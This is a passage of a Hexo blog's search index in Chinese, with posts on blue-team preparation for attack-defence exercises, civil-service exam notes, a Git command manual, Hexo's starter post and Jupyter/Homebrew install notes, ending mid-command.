<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hvv蓝方思路总结</title>
      <link href="2021/03/31/hvv%E8%93%9D%E6%96%B9%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/31/hvv%E8%93%9D%E6%96%B9%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>参加过几次攻防演练，因此笔者对此经历总结一下。</p><a id="more"></a><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>想知道”盾“厚不厚，那么就需要”矛“来戳一戳，因此我们站在黑客的视角，梳理攻击流程，再针对性的进行防守设置。</p><p>攻击者主要从外网纵向入侵和内网横向渗透。</p><h4 id="外网纵向入侵"><a href="#外网纵向入侵" class="headerlink" title="外网纵向入侵"></a>外网纵向入侵</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4ien6wylj313n0u0wn8.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gp4ien6wylj313n0u0wn8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="外网纵向入侵"></p><h4 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4inf2mb7j31eq0u0n6o.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gp4inf2mb7j31eq0u0n6o.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="内网横向渗透"></p><p><em>接下来主要对攻防演练的前期准备、进行中、结束复盘三个阶段进行具体工作方案。</em></p><h2 id="二、攻防演练Pre"><a href="#二、攻防演练Pre" class="headerlink" title="二、攻防演练Pre"></a>二、攻防演练Pre</h2><h4 id="1-日常运维及资产梳理"><a href="#1-日常运维及资产梳理" class="headerlink" title="1.日常运维及资产梳理"></a>1.日常运维及资产梳理</h4><ul><li><p>梳理软硬件资产。重点查看暴露在公网的端口的资产</p></li><li><p>清理常见CMS框架的特征。</p></li><li><p>更新软硬件资产的信息。</p></li><li><p>保持6个月以上系统日志、应用日志、中间件的访问日志。</p></li><li><p>针对网络、主机进行安全检查，并针对性的优化加固。</p></li></ul><h4 id="2-新上线业务系统的风险评估"><a href="#2-新上线业务系统的风险评估" class="headerlink" title="2.新上线业务系统的风险评估"></a>2.新上线业务系统的风险评估</h4><ul><li>未进行风险评估的业务系统禁止上线。</li></ul><h4 id="3-每月对防护机制进行排查"><a href="#3-每月对防护机制进行排查" class="headerlink" title="3.每月对防护机制进行排查"></a>3.每月对防护机制进行排查</h4><ul><li>排查公网边界具有监测告警/安全防护机制</li><li>排查安全设备应用层防护策略</li><li>排查安全设备网络层访问控制</li><li>排查操作系统本地访问控制</li><li>排查安全软件防护策略</li></ul><h4 id="4-排查软件版本漏洞"><a href="#4-排查软件版本漏洞" class="headerlink" title="4. 排查软件版本漏洞"></a>4. 排查软件版本漏洞</h4><ul><li>根据第三方漏洞平台（阿里应急响应中心等），匹配本地资产（操作系统、中间件、web框架），自动化告警漏洞存在和漏洞修复</li></ul><h4 id="5-排查软件逻辑漏洞"><a href="#5-排查软件逻辑漏洞" class="headerlink" title="5. 排查软件逻辑漏洞"></a>5. 排查软件逻辑漏洞</h4><ul><li>代码审计、渗透测试发现</li></ul><h4 id="6-安全意识培训"><a href="#6-安全意识培训" class="headerlink" title="6. 安全意识培训"></a>6. 安全意识培训</h4><h4 id="7-监测告警机制构建"><a href="#7-监测告警机制构建" class="headerlink" title="7. 监测告警机制构建"></a>7. 监测告警机制构建</h4><ul><li>内外网检测警告</li><li>构建威胁情报系统</li></ul><h4 id="8-应急响应机制构建"><a href="#8-应急响应机制构建" class="headerlink" title="8. 应急响应机制构建"></a>8. 应急响应机制构建</h4><ul><li>特定安全事件的应急预案及演练</li><li>内网的可攻击面经</li></ul><h4 id="9-容错机制构建"><a href="#9-容错机制构建" class="headerlink" title="9. 容错机制构建"></a>9. 容错机制构建</h4><ul><li>重要数据、入侵痕迹本地/异地备份</li><li>周期性测试</li></ul><h4 id="10-蜜罐构建"><a href="#10-蜜罐构建" class="headerlink" title="10. 蜜罐构建"></a>10. 蜜罐构建</h4><ul><li>开源蜜罐容易发生逃逸事件，因此不建议使用</li></ul><h2 id="三、攻防演练ing"><a href="#三、攻防演练ing" class="headerlink" title="三、攻防演练ing"></a>三、攻防演练ing</h2><p><strong>高强度、高重复性且容易发生错漏扫</strong></p><p>一次性工作：</p><ul><li>情报共享：共享攻击源IP的威胁情报，注意交接班（交班人员直接加到本地的防守策略）</li><li>人员保障：协调后台支撑专家远程待命，</li><li>现场保护：保留溯源至公网ip及攻击路径待分析</li><li>攻击溯源：根据现场残留痕迹进行最大程度的入侵溯源</li><li>优化加固：根据应急处置报告中的优化建议进行安全隐患、安全风险优化，协助软件开发商进行漏洞优化，对漏洞修复的有效性进行复测</li><li>争议处置：对于一些争议的加固意见，上报上级再分析</li><li>宁错杀，不放过：对于可能会影响到该系统业务的ip，上报上级再分析</li><li>值守计划：<ul><li>24小时值守，预备替补人员应对突发情况</li><li>编写值守成果（时间、封禁IP、漏洞修复程度等）</li><li>尽量减少对接事宜，在值守人员处理完后方可交接下一位</li></ul></li></ul><p>重复性工作：</p><ul><li>巡检安全/告警系统：</li><li>巡检安全防护硬件</li><li>巡检安全防护软件</li><li>巡检Windows</li><li>巡检Linux</li></ul>]]></content>
      
      
      <categories>
          
          <category> hvv </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="2021/03/15/baidu_verify_code-gZsZUAHhhy/"/>
      <url>2021/03/15/baidu_verify_code-gZsZUAHhhy/</url>
      
        <content type="html"><![CDATA[f85c36a24f63d87f279a63b6b11db1bf]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKNotes</title>
      <link href="2021/03/01/GKNotes/"/>
      <url>2021/03/01/GKNotes/</url>
      
        <content type="html"><![CDATA[<p>GKNotes。</p><a id="more"></a><h3 id="行测题型"><a href="#行测题型" class="headerlink" title="行测题型"></a>行测题型</h3><ul><li>言语</li><li>数量关系</li><li>判断推理</li><li>资料分析</li></ul><h1 id="言语35–80-30min"><a href="#言语35–80-30min" class="headerlink" title="言语35–80%-30min"></a>言语35–80%-30min</h1><p>课程安排</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp3dgolup0j31820g0k0a.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gp3dgolup0j31820g0k0a.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210331203705122"></p><p>题型：</p><ul><li>片段阅读</li><li>语句表达</li><li>逻辑填空</li></ul><h2 id="片段阅读"><a href="#片段阅读" class="headerlink" title="片段阅读"></a>片段阅读</h2><p>重点：转折、因果、主题词、正确及错误选项特征</p><p>解题顺序：提问–文段–选项</p><h3 id="中心理解题"><a href="#中心理解题" class="headerlink" title="中心理解题"></a>中心理解题</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp3dggvg9yj317209qtb9.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gp3dggvg9yj317209qtb9.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210331204238456"></p><p>解题思路：</p><ul><li>重点词语：关联词、主题词、程度词</li><li>行文脉络：总分、分总、总分总、分总分、分分</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> GK </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git使用手册</title>
      <link href="2021/02/05/Git%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
      <url>2021/02/05/Git%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<p>Git系统学习，使用手册。</p><a id="more"></a><p>Git 分布式版本控制系统 注：CVS及SVN集中式版本控制系统</p><h3 id="创建版本库repository"><a href="#创建版本库repository" class="headerlink" title="创建版本库repository"></a>创建版本库repository</h3><p>里面每个文件的修改、删除都可以跟踪，可以还原</p><p>利用<code>git init</code>将目录编程Git仓库，<code>.git</code>文件是Git来跟踪管理版本库</p><p>添加文件到Git仓库，分两步：</p><ol><li>使用命令<code>git add &lt;file&gt;</code>，注意，可反复多次使用，添加多个文件；</li><li>使用命令<code>git commit -m &lt;message&gt;</code>，完成。</li></ol><ul><li><p><code>git status</code>命令可以让我们时刻掌握仓库当前的状态</p></li><li><p><code>git diff</code>顾名思义就是查看difference</p></li></ul><p><code>git log</code>命令显示从最近到最远的提交日志</p><p>Head表示当前版本 版本号由sha1计算而得（可记住版本号<code>reflog</code>永久回退此版本）</p><p><code>git reset --hard XXXX</code></p><blockquote><p>仓库里把每次修改以版本号记录下来，回退某版本仅为将HEAD指向其。</p></blockquote><ul><li><p><code>HEAD</code>指向的版本就是当前版本，因此，Git允许我们在版本的历史之间穿梭，使用命令<code>git reset --hard commit_id</code>。</p></li><li><p>穿梭前，用<code>git log</code>可以查看提交历史，以便确定要回退到哪个版本。</p></li><li><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p></li></ul><h3 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h3><p>工作区<code>Working Directory</code>  -&gt; <code>git-learn</code>目录</p><p>版本库<code>Repository</code> -&gt; <code>.git</code> </p><h3 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h3><p>暂存区stage   分支master，指向master的第一个指针HEAD</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnfdxt248gj30y80hkn32.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnfdxt248gj30y80hkn32.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210207232557934"></p><p>第一步是用<code>git add</code>把文件添加进去，实际上就是把文件修改添加到暂存区；</p><p>第二步是用<code>git commit</code>提交更改，实际上就是把暂存区的所有内容提交到当前分支。</p><p>需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p><p><code>Untracked files</code> 未添加至暂存区stage</p><p><em>执行git add readme.txt &amp; LICENSE后</em></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnfe2noc7wj30wk0hijww.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnfe2noc7wj30wk0hijww.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210207233041468"></p><p>执行git commit 提交至分支master</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnfe4wy3k5j30wq0he79q.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnfe4wy3k5j30wq0he79q.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210207233251853"></p><h3 id="管理修改"><a href="#管理修改" class="headerlink" title="管理修改"></a>管理修改</h3><p>Git跟踪并管理的是<strong>修改</strong>，而非文件。</p><p><code>git commit</code>只负责把暂存区的修改提交了</p><p><code>git diff HEAD -- readme.txt</code>命令可以查看工作区和版本库里面最新版本的区别</p><h3 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h3><p><code>git checkout -- file</code>可以丢弃工作区的修改</p><ul><li><p>场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令<code>git checkout -- file</code>。</p></li><li><p>场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了场景1，第二步按场景1操作。</p></li><li><p>场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考<a href="https://www.liaoxuefeng.com/wiki/896043488029600/897013573512192">版本回退</a>一节，不过前提是没有推送到远程库。</p></li></ul><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>一是确实要从版本库中删除该文件，那就用命令<code>git rm</code>删掉，并且<code>git commit</code>：</p><p>删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本：<code> git checkout -- test.txt</code></p><h3 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h3><p><code>git push -u origin master</code> 把本地库的所有内容推送到远程库上</p><p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p><code>git push origin master</code>  把本地库的所有内容推送到远程库上</p><ul><li>要关联一个远程库，使用命令<code>git remote add origin git@server-name:path/repo-name.git</code>；</li><li>关联后，使用命令<code>git push -u origin master</code>第一次推送master分支的所有内容；</li><li>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改；</li></ul><h3 id="从远程库克隆"><a href="#从远程库克隆" class="headerlink" title="从远程库克隆"></a>从远程库克隆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:murraynizeyu&#x2F;git-learn.git</span><br></pre></td></tr></table></figure><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><p><strong>主分支</strong>：master与develop</p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnggba4li6j30g20lw0un.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnggba4li6j30g20lw0un.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208213342388" style="zoom:50%;" /><p>master：分支代表项目处于可发布的状态</p><p>develop：需要开发新功能时从develop分支拉出fb-function分支</p><p><strong>Feature branches</strong>：这种分支和我们程序员日常开发最为密切，称作功能分支。</p><p>必须从<strong>develop</strong>分支创建，完成后合并回<strong>develop</strong>分支。</p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnggt97nbdj30am0pytbi.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnggt97nbdj30am0pytbi.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208215100827" style="zoom:50%;" /><p><strong>Release branches</strong>：这个分支用来分布新版本。从<strong>develop</strong>分支创建，完成后合并回<strong>develop</strong>与<strong>master</strong>分支。</p><p><strong>Hotfix branches</strong>：这个分支主要为修复线上特别紧急的bug准备的。必须从<strong>master</strong>分支创建，完成后合并回<strong>develop</strong>与<strong>master</strong>分支。</p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnggvgc0pxj30oc0u6gt7.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnggvgc0pxj30oc0u6gt7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208215307610" style="zoom:50%;" /><p>总结一下</p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnggx1z807j30oe0z0qfa.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnggx1z807j30oe0z0qfa.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208215440319" style="zoom:50%;" /><p>我们创建<code>dev</code>分支，然后切换到<code>dev</code>分支：<code>git switch -c dev</code></p><p>通过<code>git branch</code>查看当前分支</p><p>HEAD指向当前commit版本上传的位置</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnghdia2tnj30w00gqjsy.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnghdia2tnj30w00gqjsy.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208221028400"></p><p>我们把<code>dev</code>分支的工作成果合并到<code>master</code>分支上：<code>git merge dev</code></p><p><code>git merge</code>命令用于合并指定分支到当前分支。合并后，再查看<code>readme.txt</code>的内容，就可以看到，和<code>dev</code>分支的最新提交是完全一样的。</p><p>合并完成后，就可以放心地删除<code>dev</code>分支了：<code>git branch -d dev</code></p><p>直接切换到已有的<code>master</code>分支 <code>git switch master</code></p><table><thead><tr><th align="center">功能</th><th align="center">命令</th></tr></thead><tbody><tr><td align="center">查看分支</td><td align="center"><code>git branch</code></td></tr><tr><td align="center">创建分支</td><td align="center"><code>git branch &lt;name&gt;</code></td></tr><tr><td align="center">切换分支</td><td align="center"><code>git switch &lt;name&gt;</code></td></tr><tr><td align="center">创建+切换分支</td><td align="center"><code>git switch -c &lt;name&gt;</code></td></tr><tr><td align="center">合并某分支到当前分支</td><td align="center"><code>git merge &lt;name&gt;</code></td></tr><tr><td align="center">删除分支</td><td align="center"><code>git branch -d &lt;name&gt;</code></td></tr></tbody></table><h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>准备新的<code>feature1</code>分支，继续我们的新分支开发</p><p>Git还会自动提示我们当前<code>master</code>分支比远程的<code>master</code>分支要超前1个提交</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnghutdl4ij30vo032aag.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnghutdl4ij30vo032aag.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208222706737"></p><p>回到master分支修改readme.txt再次提交 注意产生冲突</p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnghyd9cqrj30vm0jmtaw.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gnghyd9cqrj30vm0jmtaw.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208223031773" style="zoom:50%;" /><p>通过对readme.txt文件进行修改解决冲突后再上传</p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gngi1rp9cqj310i0j0goa.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/008eGmZEly1gngi1rp9cqj310i0j0goa.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210208223346565" style="zoom:50%;" /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --graph --pretty&#x3D;oneline --abbrev-commit 查看分支合并情况</span><br></pre></td></tr></table></figure><h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><p><strong>Bug分支</strong></p><ul><li><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p></li><li><p>当手头工作没有完成时，先把工作现场<code>git stash</code>一下，然后去修复bug，修复后，再<code>git stash pop</code>，回到工作现场；</p></li><li><p>在master分支上修复的bug，想要合并到当前dev分支，可以用<code>git cherry-pick &lt;commit&gt;</code>命令，把bug提交的修改“复制”到当前分支，避免重复劳动。</p></li></ul><p><strong>Feature分支</strong></p><p><em>添加一个新功能时，你肯定不希望因为一些实验性质的代码，把主分支搞乱了，所以，每添加一个新功能，最好新建一个feature分支，在上面开发，完成后，合并，最后，删除该feature分支。</em></p><p>一切顺利的话，feature分支和bug分支是类似的，合并，然后删除。</p><p>就地销毁<code>git branch -D feature-v</code></p><h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><h4 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h4><p>显示抓取和推送的origin地址  <code>git remote -v</code></p><p>推送本地到远程库 <code>git push origin main</code></p><ul><li><code>master</code>分支是主分支，因此要时刻与远程同步；</li><li><code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</li><li>bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</li><li>feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</li></ul><h4 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h4><ul><li><p>从本地推送分支，使用<code>git push origin branch-name</code>，如果推送失败，先用<code>git pull</code>抓取远程的新提交；</p></li><li><p>在本地创建和远程分支对应的分支，使用<code>git checkout -b branch-name origin/branch-name</code>，本地和远程分支的名称最好一致；</p></li><li><p>建立本地分支和远程分支的关联，使用<code>git branch --set-upstream branch-name origin/branch-name</code>；</p></li><li><p>从远程抓取分支，使用<code>git pull</code>，如果有冲突，要先处理冲突。</p></li></ul><h3 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h3>]]></content>
      
      
      <categories>
          
          <category> 工具书 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/01/28/hello-world/"/>
      <url>2021/01/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>部分软件安装记录</title>
      <link href="2021/01/05/%E9%83%A8%E5%88%86%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
      <url>2021/01/05/%E9%83%A8%E5%88%86%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>一些记不住的Linux和Docker命令。</p><a id="more"></a><h2 id="Jupyter-Notebook"><a href="#Jupyter-Notebook" class="headerlink" title="Jupyter Notebook"></a>Jupyter Notebook</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><p>升级pip3 <code>pip3 install --upgrade pip&amp;pip3 install jupyter</code></p><h3 id="2-运行"><a href="#2-运行" class="headerlink" title="2.运行"></a>2.运行</h3><p>查看帮助<code>jupyter notebook -h</code></p><p>运行<code>jupyter notebook</code> 默认888端口</p><p>指定端口 <code>jupyter notebook --port &lt;XXX&gt;</code></p><p>后台运行 <code>jupyter notebook --no-browser</code></p><h3 id="3-主题设置"><a href="#3-主题设置" class="headerlink" title="3.主题设置"></a>3.主题设置</h3><p>安装<code>pip3 install jupyterthemes</code></p><p>列出可用的主题<code>jt -l</code></p><p>选择主题<code>jt -t XXX</code></p><h3 id="4-扩展设置"><a href="#4-扩展设置" class="headerlink" title="4.扩展设置"></a>4.扩展设置</h3><p>安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install jupyter_contrib_nbextensions</span><br><span class="line">jupyter contrib nbextension install --user</span><br><span class="line">pip install jupyter_nbextensions_configurator</span><br></pre></td></tr></table></figure><h2 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h2><p>安装</p><p> <code>/usr/bin/ruby -e 